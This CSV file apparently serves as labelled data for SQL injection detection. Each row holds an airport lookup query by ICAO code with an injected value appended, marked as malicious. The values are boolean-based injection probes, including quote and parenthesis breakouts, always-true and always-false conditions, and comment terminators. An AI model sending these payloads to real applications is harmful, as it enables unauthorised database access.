full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = 'AGBT"") AS qUAW WHERE 1438=1438 AND 1466=1466-- yHxz';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""=""AGBT"" AND 1617=2018 AND ""AGBT""=""AGBT';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT""=""AGBT"" AND 1466=1466 AND ""AGBT""=""AGBT';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' IN BOOLEAN MODE) AND 8186=9666#';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT' IN BOOLEAN MODE) AND 1466=1466#';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AND 4169=5085-- QwVX';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AND 1466=1466-- ItNf';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AND 9408=5309 AND (3415=3415';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AND 1466=1466 AND (1268=1268';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT)) AND 7242=5622 AND ((5854=5854';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT)) AND 1466=1466 AND ((5077=5077';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT))) AND 6364=1415 AND (((8457=8457';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT))) AND 1466=1466 AND (((6943=6943';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 6901=9985';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 1466=1466';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 4201=9664-- dxmS';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 1466=1466-- Truu';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 2637=6628# eEmv';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT AND 1466=1466# JuSK';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) WHERE 8289=8289 AND 7882=6100-- CqzI';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) WHERE 7807=7807 AND 1466=1466-- uFcI';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT WHERE 2542=2542 AND 3975=6784-- qYbf';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT WHERE 7867=7867 AND 1466=1466-- HbCL';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT+(SELECT gWBi WHERE 9803=9803 AND 9220=1272)+';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT+(SELECT FPug WHERE 9588=9588 AND 1466=1466)+';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT)) AS ThZb WHERE 8555=8555 AND 7616=1942-- lapY';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT)) AS cAnb WHERE 8972=8972 AND 1466=1466-- HWMj';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AS JSag WHERE 5770=5770 AND 8963=2027-- qUGe';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT) AS SGLC WHERE 4984=4984 AND 1466=1466-- JGEd';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT` WHERE 4268=4268 AND 8484=2732-- xepP';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT` WHERE 9290=9290 AND 1466=1466-- LmUA';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT`) WHERE 2800=2800 AND 7376=8892-- JboV';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT`) WHERE 7576=7576 AND 1466=1466-- cxzw';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT`=`AGBT` AND 2455=2294 AND `AGBT`=`AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT`=`AGBT` AND 1466=1466 AND `AGBT`=`AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT]-(SELECT 0 WHERE 8155=8155 AND 6403=4383)|[AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT]-(SELECT 0 WHERE 2345=2345 AND 1466=1466)|[AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2536';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5800') OR 6027=5281-- McbE';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6035') OR 2994=2994-- pkQF';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6636' OR 4929=5418-- fZrM';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5932' OR 2994=2994-- lzqG';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7615' OR 3340=1525-- gWvc';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2157' dbLhrujWxH-- LVeh';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-5547"" OR 2719=3732-- kpsI';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-3645"" OR 2994=2994-- KrVo';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9342') OR 2899=7886 AND ('QUEc'='QUEc';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1569') OR 2994=2994 AND ('IkgM'='IkgM';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3613')) OR 4839=1308 AND (('oyil'='oyil';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6059')) OR 2994=2994 AND (('oscn'='oscn';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1592'))) OR 8553=1794 AND ((('nYzL'='nYzL';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9463'))) OR 2994=2994 AND ((('QzNF'='QzNF';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3549' OR 2339=2466 AND 'eqew'='eqew';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9583' OR 2994=2994 AND 'CNVU'='CNVU';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3259' OR 3750=2473 AND 'ZDFh'='ZDFh';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3182' dbLhrujWxH AND 'dIXl'='dIXl';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6616') OR 5282=6973 AND ('redM' LIKE 'redM';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1017') OR 2994=2994 AND ('LIeh' LIKE 'LIeh';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1686')) OR 6284=6368 AND (('ZJqm' LIKE 'ZJqm';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7143')) OR 2994=2994 AND (('ztqj' LIKE 'ztqj';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7434'))) OR 9011=9437 AND ((('yqSr' LIKE 'yqSr';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5273'))) OR 2994=2994 AND ((('lvjz' LIKE 'lvjz';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-8045%' OR 5472=4416 AND 'pcWv%'='pcWv';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3119%' OR 2994=2994 AND 'CATf%'='CATf';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5177' OR 1359=2437 AND 'jQPv' LIKE 'jQPv';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2214' OR 2994=2994 AND 'YBtt' LIKE 'YBtt';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2829' OR 8729=5832 AND 'VcrB' LIKE 'VcrB';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-8292' dbLhrujWxH AND 'bScG' LIKE 'bScG';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-4602"") OR 9297=8374 AND (""oHHv""=""oHHv';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8221"") OR 2994=2994 AND (""KDXJ""=""KDXJ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8056"")) OR 9376=2737 AND ((""hHxF""=""hHxF';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-4269"")) OR 2994=2994 AND ((""gVwe""=""gVwe';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8812""))) OR 1441=3491 AND (((""bnox""=""bnox';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-5480""))) OR 2994=2994 AND (((""iJHh""=""iJHh';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-7166"" OR 7556=8645 AND ""jeow""=""jeow';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-1586"" OR 2994=2994 AND ""qKaU""=""qKaU';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-2891"") OR 8292=8984 AND (""JrUI"" LIKE ""JrUI';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-9272"") OR 2994=2994 AND (""FsZC"" LIKE ""FsZC';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-3846"")) OR 7929=8143 AND ((""iEQU"" LIKE ""iEQU';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-7214"")) OR 2994=2994 AND ((""OExi"" LIKE ""OExi';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8229""))) OR 1681=2613 AND (((""mZDa"" LIKE ""mZDa';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-2408""))) OR 2994=2994 AND (((""vzJo"" LIKE ""vzJo';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-5035"" OR 6127=5157 AND ""oqgU"" LIKE ""oqgU';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-7816"" OR 2994=2994 AND ""QbGB"" LIKE ""QbGB';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7914' OR 9230=6175 OR 'sHZU'='cuDg';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1841' OR 2994=2994 OR 'PBxu'='NKfc';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5136' OR 7664=4874 OR 'OYCE'='ROHq';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5870' dbLhrujWxH OR 'Tfem'='MPsa';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3987') WHERE 3540=3540 OR 1048=8638-- BLlW';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1848') WHERE 3289=3289 OR 2994=2994-- ANuq';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-6033"") WHERE 1908=1908 OR 3730=6654-- SyXM';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8307"") WHERE 5961=5961 OR 2994=2994-- KJTz';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-4556' WHERE 9113=9113 OR 5308=2394-- czBx';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1541' WHERE 4780=4780 OR 2994=2994-- Lpkk';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8580"" WHERE 7460=7460 OR 3176=1131-- MFdz';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-7243"" WHERE 9824=9824 OR 2994=2994-- CuFn';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-8731')) AS mQhG WHERE 3818=3818 OR 5506=5466-- BHue';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-8826')) AS MAbY WHERE 2110=2110 OR 2994=2994-- bPIP';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-5533"")) AS bNIE WHERE 8930=8930 OR 7598=3562-- PUiK';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-3985"")) AS vkFs WHERE 5233=5233 OR 2994=2994-- XLRA';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9180') AS jDpU WHERE 1083=1083 OR 9462=3853-- nRix';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2242') AS eAXv WHERE 8784=8784 OR 2994=2994-- QfHw';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8282"") AS BqtU WHERE 7213=7213 OR 9767=7224-- JXsK';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = '-8417"") AS xpug WHERE 6147=6147 OR 2994=2994-- scSq';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1330) OR 1604=9008-- AKvL';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5201) OR 2994=2994-- KRKq';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6068) OR 3234=7623 AND (9584=9584';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2077) OR 2994=2994 AND (7081=7081';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1513)) OR 4196=1319 AND ((4176=4176';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-4677)) OR 2994=2994 AND ((8028=8028';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3010))) OR 4708=5453 AND (((4395=4395';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-1077))) OR 2994=2994 AND (((3710=3710';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-4253 OR 8832=4947';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3183 OR 2994=2994';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7986 OR 5022=6520-- pyJH';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5714 OR 2994=2994-- UYAc';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9582 OR 6846=8086# mylb';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-2318 OR 2994=2994# Jufk';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-6540) WHERE 1799=1799 OR 3286=7920-- wyJA';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9971) WHERE 7707=7707 OR 2994=2994-- aSdL';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-7646 WHERE 4107=4107 OR 5548=5883-- hUmU';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-9345 WHERE 6859=6859 OR 2994=2994-- jjpA';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-3189)) AS oWNC WHERE 2443=2443 OR 2021=7033-- wkUz';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = '-5276)) AS uFtw WHERE 7008=7008 OR 2994=2994-- gbxt';,1,airport-S1,Unknown,Unknown
